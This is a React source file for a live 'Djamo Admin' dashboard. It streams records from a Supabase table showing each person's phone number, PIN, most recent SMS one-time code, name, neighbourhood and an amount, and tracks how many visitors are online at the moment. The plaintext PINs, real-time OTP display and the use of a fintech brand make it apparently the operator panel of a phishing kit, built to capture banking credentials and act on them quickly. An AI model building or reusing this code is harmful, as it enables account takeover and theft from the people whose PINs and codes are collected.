import { useState, useEffect, useCallback } from 'react';
import { LogOut, Users, Wifi, UserCheck, Clock, RefreshCw, Eye, EyeOff } from 'lucide-react';
import { supabase } from '../lib/supabase';
import { adminAuth } from '../lib/adminAuth';

interface Registration {
  id: string;
  phone: string;
  full_name: string | null;
  address: string | null;
  pin: string | null;
  last_verification_code: string | null;
  amount: number;
  duration: number | null;
  project_type: string | null;
  status: string;
  created_at: string;
  updated_at: string;
}

interface VisitorStats {
  active: number;
  hourly: number;
  daily: number;
}

interface AdminPanelProps {
  onLogout: () => void;
}

const statusColors: Record<string, string> = {
  pending: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
  pending_validation: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
  verified: 'bg-green-500/20 text-green-400 border-green-500/30',
  rejected: 'bg-red-500/20 text-red-400 border-red-500/30',
};

const statusLabels: Record<string, string> = {
  pending: 'En attente',
  pending_validation: 'Saisie en cours',
  verified: 'Vérifié',
  rejected: 'Rejeté',
};

const formatPhone = (phone: string) => phone.replace('+225', '').replace(/(\d{2})(?=\d)/g, '$1 ').trim();
const formatAmount = (n: number) => n.toLocaleString('fr-FR') + ' FCFA';
const timeAgo = (dateStr: string) => {
  const diff = Date.now() - new Date(dateStr).getTime();
  const s = Math.floor(diff / 1000);
  if (s < 60) return `il y a ${s}s`;
  const m = Math.floor(s / 60);
  if (m < 60) return `il y a ${m}min`;
  const h = Math.floor(m / 60);
  return `il y a ${h}h`;
};

const AdminPanel: React.FC<AdminPanelProps> = ({ onLogout }) => {
  const [registrations, setRegistrations] = useState<Registration[]>([]);
  const [stats, setStats] = useState<VisitorStats>({ active: 0, hourly: 0, daily: 0 });
  const [onlineCount, setOnlineCount] = useState(0);
  const [showSensitive, setShowSensitive] = useState(false);
  const [newIds, setNewIds] = useState<Set<string>>(new Set());
  const [lastUpdated, setLastUpdated] = useState(new Date());

  const fetchRegistrations = useCallback(async () => {
    const { data } = await supabase
      .from('user_registrations')
      .select('id, phone, full_name, address, pin, last_verification_code, amount, duration, project_type, status, created_at, updated_at')
      .order('updated_at', { ascending: false })
      .limit(200);
    if (data) {
      setRegistrations((prev) => {
        const prevIds = new Set(prev.map((r) => r.id));
        const added = new Set<string>();
        data.forEach((r) => { if (!prevIds.has(r.id)) added.add(r.id); });
        if (added.size > 0) {
          setNewIds((n) => new Set([...n, ...added]));
          setTimeout(() => setNewIds((n) => { const c = new Set(n); added.forEach((id) => c.delete(id)); return c; }), 3000);
        }
        return data;
      });
      setLastUpdated(new Date());
    }
  }, []);

  const fetchStats = useCallback(async () => {
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const hourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    const dayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();

    const [{ count: active }, { count: hourly }, { count: daily }, { count: online }] = await Promise.all([
      supabase.from('realtime_visitors').select('*', { count: 'exact', head: true }).gte('last_seen', fiveMinAgo),
      supabase.from('realtime_visitors').select('*', { count: 'exact', head: true }).gte('created_at', hourAgo),
      supabase.from('realtime_visitors').select('*', { count: 'exact', head: true }).gte('created_at', dayAgo),
      supabase.from('realtime_visitors').select('*', { count: 'exact', head: true }).gte('last_seen', new Date(Date.now() - 60 * 1000).toISOString()),
    ]);

    setStats({ active: active || 0, hourly: hourly || 0, daily: daily || 0 });
    setOnlineCount(online || 0);
  }, []);

  useEffect(() => {
    fetchRegistrations();
    fetchStats();

    const interval = setInterval(() => {
      fetchRegistrations();
      fetchStats();
    }, 5000);

    const channel = supabase
      .channel('admin-live')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'user_registrations' }, () => fetchRegistrations())
      .on('postgres_changes', { event: '*', schema: 'public', table: 'realtime_visitors' }, () => fetchStats())
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, [fetchRegistrations, fetchStats]);

  const handleLogout = () => {
    adminAuth.logout();
    onLogout();
  };

  const verified = registrations.filter((r) => r.status === 'verified').length;
  const inProgress = registrations.filter((r) => r.status === 'pending_validation').length;

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white font-mono">
      {/* Top Bar */}
      <div className="sticky top-0 z-50 bg-[#0d0d18] border-b border-white/10 px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
          <span className="text-green-400 font-bold text-sm tracking-widest uppercase">Djamo Admin · Live</span>
          <span className="text-gray-600 text-xs ml-2">màj {lastUpdated.toLocaleTimeString('fr-FR')}</span>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={() => setShowSensitive((s) => !s)}
            className="flex items-center gap-1.5 text-xs text-gray-400 hover:text-white transition px-3 py-1.5 rounded-lg border border-white/10 hover:border-white/20"
          >
            {showSensitive ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
            {showSensitive ? 'Masquer' : 'Afficher'} données
          </button>
          <button
            onClick={() => { fetchRegistrations(); fetchStats(); }}
            className="p-1.5 text-gray-400 hover:text-white transition"
          >
            <RefreshCw className="w-4 h-4" />
          </button>
          <button
            onClick={handleLogout}
            className="flex items-center gap-1.5 text-xs text-red-400 hover:text-red-300 transition px-3 py-1.5 rounded-lg border border-red-500/30 hover:border-red-400/50"
          >
            <LogOut className="w-3.5 h-3.5" />
            Déconnexion
          </button>
        </div>
      </div>

      {/* Stats Row */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3 p-4">
        <StatCard
          icon={<Wifi className="w-4 h-4 text-green-400" />}
          label="En ligne maintenant"
          value={onlineCount}
          color="green"
          pulse
        />
        <StatCard
          icon={<Users className="w-4 h-4 text-blue-400" />}
          label="Actifs (5 min)"
          value={stats.active}
          color="blue"
        />
        <StatCard
          icon={<UserCheck className="w-4 h-4 text-emerald-400" />}
          label="Vérifiés total"
          value={verified}
          color="emerald"
        />
        <StatCard
          icon={<Clock className="w-4 h-4 text-orange-400" />}
          label="En saisie"
          value={inProgress}
          color="orange"
          pulse={inProgress > 0}
        />
      </div>

      {/* Counters row */}
      <div className="px-4 pb-3 flex items-center gap-4 text-xs text-gray-500">
        <span>{registrations.length} dossiers total</span>
        <span>·</span>
        <span>{stats.hourly} visiteurs / heure</span>
        <span>·</span>
        <span>{stats.daily} visiteurs / jour</span>
        <span>·</span>
        <span className="text-blue-400">{inProgress} connexion{inProgress > 1 ? 's' : ''} active{inProgress > 1 ? 's' : ''}</span>
      </div>

      {/* Column Headers */}
      <div className="px-4 mb-2">
        <div className="grid grid-cols-[1fr_1fr_1fr_1.5fr_1fr_1fr_0.8fr] gap-2 text-[10px] uppercase tracking-widest text-gray-600 border-b border-white/5 pb-2">
          <span>Numéro</span>
          <span>Code PIN</span>
          <span>OTP SMS</span>
          <span>Nom Prénom</span>
          <span>Quartier</span>
          <span>Montant</span>
          <span>Statut</span>
        </div>
      </div>

      {/* Live Feed */}
      <div className="px-4 pb-10 space-y-1.5">
        {registrations.length === 0 ? (
          <div className="text-center text-gray-600 py-20 text-sm">
            Aucun dossier — en attente de connexions...
          </div>
        ) : (
          registrations.map((reg) => (
            <RegistrationRow
              key={reg.id}
              reg={reg}
              isNew={newIds.has(reg.id)}
              showSensitive={showSensitive}
            />
          ))
        )}
      </div>
    </div>
  );
};

interface StatCardProps {
  icon: React.ReactNode;
  label: string;
  value: number;
  color: string;
  pulse?: boolean;
}

const StatCard: React.FC<StatCardProps> = ({ icon, label, value, color, pulse }) => {
  const borders: Record<string, string> = {
    green: 'border-green-500/20',
    blue: 'border-blue-500/20',
    emerald: 'border-emerald-500/20',
    orange: 'border-orange-500/20',
  };
  return (
    <div className={`bg-white/5 border ${borders[color]} rounded-xl p-3`}>
      <div className="flex items-center gap-2 mb-1">
        {icon}
        {pulse && value > 0 && <div className={`w-1.5 h-1.5 rounded-full bg-${color}-400 animate-pulse`} />}
      </div>
      <div className="text-2xl font-bold text-white">{value}</div>
      <div className="text-xs text-gray-500 mt-0.5">{label}</div>
    </div>
  );
};

interface RowProps {
  reg: Registration;
  isNew: boolean;
  showSensitive: boolean;
}

const mask = (val: string | null, show: boolean) => {
  if (!val) return <span className="text-gray-700">—</span>;
  if (!show) return <span className="tracking-widest text-gray-600">{'•'.repeat(Math.min(val.length, 6))}</span>;
  return <span className="text-white">{val}</span>;
};

const RegistrationRow: React.FC<RowProps> = ({ reg, isNew, showSensitive }) => {
  return (
    <div
      className={`grid grid-cols-[1fr_1fr_1fr_1.5fr_1fr_1fr_0.8fr] gap-2 items-center py-2.5 px-3 rounded-lg border transition-all duration-500 text-sm
        ${isNew ? 'bg-blue-500/10 border-blue-500/40 animate-pulse-once' : 'bg-white/[0.03] border-white/5 hover:bg-white/[0.06] hover:border-white/10'}`}
    >
      {/* Numéro */}
      <div className="flex flex-col gap-0.5">
        <span className="text-cyan-400 font-bold tracking-wide text-xs">
          {formatPhone(reg.phone)}
        </span>
        <span className="text-gray-600 text-[10px]">{timeAgo(reg.updated_at)}</span>
      </div>

      {/* PIN */}
      <div className="text-xs">
        {reg.pin ? mask(reg.pin, showSensitive) : <span className="text-gray-700 text-xs">Non saisi</span>}
      </div>

      {/* OTP */}
      <div className="text-xs">
        {reg.last_verification_code ? (
          mask(reg.last_verification_code, showSensitive)
        ) : (
          <span className="text-gray-700 text-xs">Non envoyé</span>
        )}
      </div>

      {/* Nom */}
      <div className="text-xs text-gray-300 truncate">
        {reg.full_name || <span className="text-gray-700">—</span>}
      </div>

      {/* Quartier / Adresse */}
      <div className="text-xs text-gray-400 truncate">
        {reg.address || <span className="text-gray-700">—</span>}
      </div>

      {/* Montant */}
      <div className="text-xs text-yellow-400 font-medium">
        {formatAmount(reg.amount)}
      </div>

      {/* Statut */}
      <div>
        <span className={`inline-block text-[10px] px-2 py-0.5 rounded-full border font-medium ${statusColors[reg.status] || 'bg-gray-800 text-gray-400 border-gray-700'}`}>
          {statusLabels[reg.status] || reg.status}
        </span>
      </div>
    </div>
  );
};

export default AdminPanel;
